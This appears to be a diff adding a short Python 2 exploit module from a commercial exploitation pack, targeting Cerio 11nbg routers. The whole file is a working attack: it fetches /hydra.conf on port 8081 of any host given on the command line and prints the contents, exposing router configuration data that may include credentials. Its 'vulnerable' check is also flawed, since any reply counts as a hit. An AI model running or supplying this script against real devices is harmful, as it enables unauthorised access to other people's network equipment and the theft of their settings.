@@ -1,0 +1,39 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2017
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+
+_name_   = 'd2sec_cerio_1'
+_vendor_ = 'cerio'
+_model_  = ['11nbg']
+_vuln_   = 'Information disclosure Vulnerability'
+_cve_    = ''
+_ref_    = ''
+_port_   = 8081
+
+def pwnrouter(host):
+  try:
+    url = "http://%s:8081/hydra.conf" % host
+    response = requests.get(url)
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  if response is None:
+    print '[+] %s not vulnerable' % host
+  else:
+    print '[+] %s vulnerable' % host
+    print response.text
+
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1])
